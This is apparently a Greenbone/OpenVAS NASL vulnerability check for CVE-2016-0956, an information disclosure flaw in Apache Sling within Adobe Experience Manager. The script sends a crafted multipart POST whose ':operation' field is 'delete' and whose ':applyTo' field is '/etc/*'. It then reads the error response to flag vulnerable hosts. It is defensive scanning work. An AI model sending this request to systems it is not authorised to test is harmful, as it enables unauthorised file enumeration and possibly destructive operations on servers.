CPE = "cpe:/a:adobe:experience_manager";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807066" );
	script_version( "2021-06-29T10:30:56+0000" );
	script_cve_id( "CVE-2016-0956" );
	script_bugtraq_id( 83119 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-06-29 10:30:56 +0000 (Tue, 29 Jun 2021)" );
	script_tag( name: "creation_date", value: "2016-02-11 14:43:49 +0530 (Thu, 11 Feb 2016)" );
	script_name( "Apache Sling Framework (Adobe AEM) Information Disclosure Vulnerability (APSB16-05)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_adobe_aem_http_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "adobe/aem/http/detected" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/39435" );
	script_xref( name: "URL", value: "https://helpx.adobe.com/security/products/experience-manager/apsb16-05.html" );
	script_xref( name: "Advisory-ID", value: "APSB16-05" );
	script_tag( name: "summary", value: "Apache Sling Framework (Adobe AEM) is prone to an information
  disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "insight", value: "The flaw is due to lack of proper security controls or
  misconfiguration." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote unauthenticated users
  to enumerate local system files/folders that are not accessible publicly to unauthenticated users." );
	script_tag( name: "affected", value: "Apache Sling Framework version 2.3.6 as used in Adobe
  Experience Manager 5.6.1, 6.0.0 and 6.1.0." );
	script_tag( name: "solution", value: "Update to Apache Sling Servlets Post 2.3.8 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/libs/granite/core/content/login.html";
host = http_host_name( port: port );
data = NASLString( "--------------------------87cb9e2d2eed80d5\r\n", "Content-Disposition: form-data; name=\":operation\"\r\n\r\n", "delete\r\n", "-------------------------87cb9e2d2eed80d5\r\n", "Content-Disposition: form-data; name=\":applyTo\"\r\n\r\n", "/etc/*\r\n", "--------------------------87cb9e2d2eed80d5--\r\n" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: ", strlen( data ), "\\r\\n", "Content-Type: multipart/form-data; boundary=------------------------87cb9e2d2eed80d5\\r\\n", "\\r\\n", data, "\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req );
if(res && ContainsString( res, "id=\"ChangeLog" ) && IsMatchRegexp( res, "^HTTP/1\\.[01] 500" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

